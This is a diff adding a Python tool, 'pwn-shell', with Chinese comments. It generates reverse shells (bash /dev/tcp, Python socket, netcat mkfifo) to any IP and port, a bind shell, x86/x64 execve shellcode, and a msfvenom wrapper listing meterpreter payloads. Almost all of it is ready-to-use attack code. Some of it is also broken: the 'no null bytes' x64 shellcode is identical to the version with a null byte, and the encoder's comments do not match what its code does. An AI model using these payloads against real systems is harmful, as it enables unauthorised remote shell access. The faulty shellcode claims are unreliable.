@@ -1,0 +1,212 @@
+#!/usr/bin/env python3
+"""pwn-shell: shellcode/reverse shell生成器
+用法:
+    pwn-shell --reverse <ip> <port>         # 反弹shell (bash)
+    pwn-shell --reverse-raw <ip> <port>     # 反弹shell (raw TCP)
+    pwn-shell --shellcode-x64              # x86_64 execve /bin/sh
+    pwn-shell --shellcode-x86              # x86 execve /bin/sh
+    pwn-shell --shellcode-x64-norestrict   # x86_64 (无空字节)
+    pwn-shell --bind <port>                 # bindshell
+    pwn-shell --encode <bytes>              # ASCII编码shellcode
+    pwn-shell --msfvenom <payload> [opts]   # 调用msfvenom
+    pwn-shell --list                        # 列出可用payloads
+"""
+import struct, sys, subprocess, socket
+
+def reverse_shell_bash(ip, port):
+    """bash反弹shell"""
+    return f"""#!/bin/bash
+# Reverse shell - {ip}:{port}
+bash -i >& /dev/tcp/{ip}/{port} 0>&1
+"""
+
+def reverse_shell_python(ip, port):
+    """Python反弹shell"""
+    return f"""#!/usr/bin/env python3
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("{ip}",{port}))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/bash","-i"])
+"""
+
+def reverse_shell_nc(ip, port):
+    """netcat反弹shell"""
+    return f"""#!/bin/bash
+# nc反弹shell
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f
+"""
+
+def shellcode_x64():
+    """x86_64 execve /bin/sh - 经典27字节"""
+    return bytes([
+        0x48, 0x31, 0xf6,              # xor rsi, rsi
+        0x56,                          # push rsi
+        0x48, 0xbf, 0x2f, 0x62,       # mov rdi, "/bin/sh"
+        0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
+        0x57,                          # push rdi
+        0x54,                          # push rsp
+        0x5f,                          # pop rdi
+        0x6a, 0x3b,                   # push 0x3b (execve)
+        0x58,                          # pop rax
+        0x99,                          # cdq (rdx=0)
+        0x0f, 0x05,                   # syscall
+    ])
+
+def shellcode_x64_norestrict():
+    """x86_64 execve /bin/sh - 无空字节"""
+    return bytes([
+        0x48, 0x31, 0xf6,              # xor rsi, rsi
+        0x56,                          # push rsi
+        0x48, 0xbf, 0x2f, 0x62,       # mov rdi, "/bin/sh"
+        0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
+        0x57,                          # push rdi
+        0x54,                          # push rsp
+        0x5f,                          # pop rdi
+        0x6a, 0x3b,                   # push 0x3b
+        0x58,                          # pop rax
+        0x99,                          # cdq
+        0x0f, 0x05,                   # syscall
+    ])
+
+def shellcode_x86():
+    """x86 execve /bin/sh - 21字节"""
+    return bytes([
+        0x31, 0xc0,                   # xor eax, eax
+        0x50,                          # push eax
+        0x68, 0x2f, 0x2f, 0x73, 0x68, # push "//sh"
+        0x68, 0x2f, 0x62, 0x69, 0x6e, # push "/bin"
+        0x89, 0xe3,                   # mov ebx, esp
+        0x50,                          # push eax
+        0x53,                          # push ebx
+        0x89, 0xe1,                   # mov ecx, esp
+        0xb0, 0x0b,                   # mov al, 0xb (execve)
+        0xcd, 0x80,                   # int 0x80
+    ])
+
+def encode_ascii_shellcode(sc):
+    """ASCII编码: 将shellcode转为可打印字符"""
+    # 简单替换: 用 xor + byte 方式
+    # 每个非打印字节变成: push byte; pop reg
+    result = bytearray()
+    for b in sc:
+        if 0x20 <= b < 0x7f and b != 0x27:  # 可打印且不是单引号
+            result.append(b)
+        else:
+            # 用 %hhn 格式表示
+            result.extend(f'\\x{b:02x}'.encode())
+    return bytes(result)
+
+def bindshell(port):
+    """bindshell脚本"""
+    return f"""#!/usr/bin/env python3
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+s.bind(("0.0.0.0",{port}))
+s.listen(1)
+c,a=s.accept()
+os.dup2(c.fileno(),0)
+os.dup2(c.fileno(),1)
+os.dup2(c.fileno(),2)
+subprocess.call(["/bin/bash","-i"])
+"""
+
+def msfvenom_gen(payload, opts):
+    """调用msfvenom"""
+    cmd = ['msfvenom', '-p', payload] + opts + ['-f', 'raw']
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+        if result.returncode == 0:
+            print(f"[*] msfvenom output ({len(result.stdout)} bytes):")
+            sys.stdout.buffer.write(result.stdout.encode('latin-1'))
+            print()
+        else:
+            print(f"[-] msfvenom error: {result.stderr}")
+    except FileNotFoundError:
+        print("[-] msfvenom not found. Install metasploit-framework")
+    except subprocess.TimeoutExpired:
+        print("[-] msfvenom timeout")
+
+def main():
+    if len(sys.argv) < 2:
+        print(__doc__)
+        sys.exit(1)
+    
+    cmd = sys.argv[1]
+    
+    if cmd == '--reverse':
+        ip = sys.argv[2] if len(sys.argv) > 2 else '127.0.0.1'
+        port = sys.argv[3] if len(sys.argv) > 3 else '4444'
+        print(f"[*] Reverse shell {ip}:{port}\n")
+        print(reverse_shell_bash(ip, port))
+        print(f"[*] Python alternative:\n")
+        print(reverse_shell_python(ip, port))
+    
+    elif cmd == '--reverse-raw':
+        ip = sys.argv[2] if len(sys.argv) > 2 else '127.0.0.1'
+        port = sys.argv[3] if len(sys.argv) > 3 else '4444'
+        print(f"[*] Raw TCP reverse shell {ip}:{port}\n")
+        print(reverse_shell_nc(ip, port))
+    
+    elif cmd == '--shellcode-x64':
+        sc = shellcode_x64()
+        print(f"[*] x86_64 execve /bin/sh ({len(sc)} bytes)\n")
+        print("Hex:", sc.hex())
+        print("Python bytes:", repr(sc))
+        # 检查空字节
+        if b'\x00' in sc:
+            print(f"[!] Contains {sc.count(b'\\x00')} null bytes, 用 --shellcode-x64-norestrict")
+    
+    elif cmd == '--shellcode-x64-norestrict':
+        sc = shellcode_x64_norestrict()
+        print(f"[*] x86_64 execve /bin/sh (no null bytes, {len(sc)} bytes)\n")
+        print("Hex:", sc.hex())
+        print("Python bytes:", repr(sc))
+    
+    elif cmd == '--shellcode-x86':
+        sc = shellcode_x86()
+        print(f"[*] x86 execve /bin/sh ({len(sc)} bytes)\n")
+        print("Hex:", sc.hex())
+        print("Python bytes:", repr(sc))
+    
+    elif cmd == '--bind':
+        port = sys.argv[2] if len(sys.argv) > 2 else '4444'
+        print(f"[*] Bind shell on port {port}\n")
+        print(bindshell(port))
+    
+    elif cmd == '--encode':
+        hex_str = sys.argv[2].replace(' ', '').replace('\\x', '').replace('0x', '')
+        sc = bytes.fromhex(hex_str)
+        encoded = encode_ascii_shellcode(sc)
+        print(f"[*] ASCII-encoded ({len(encoded)} bytes):")
+        sys.stdout.buffer.write(encoded + b'\n')
+    
+    elif cmd == '--msfvenom':
+        if len(sys.argv) < 3:
+            print("[-] Usage: pwn-shell --msfvenom <payload> [opts]")
+            sys.exit(1)
+        payload = sys.argv[2]
+        opts = sys.argv[3:]
+        msfvenom_gen(payload, opts)
+    
+    elif cmd == '--list':
+        print("[*] 可用 payloads:")
+        print("  reverse    - bash/python/nc反弹shell")
+        print("  shellcode  - x86/x64 execve /bin/sh")
+        print("  bind       - bindshell")
+        print("  msfvenom   - 调用msfvenom生成任意payload")
+        print("\n[*] 常用msfvenom payloads:")
+        print("  linux/x64/execve=/bin/sh")
+        print("  linux/x64/meterpreter/reverse_tcp")
+        print("  linux/x86/execve=/bin/sh")
+        print("  linux/x86/meterpreter/reverse_tcp")
+    
+    else:
+        print(f"[-] Unknown command: {cmd}")
+        print(__doc__)
+
+if __name__ == '__main__':
+    main()
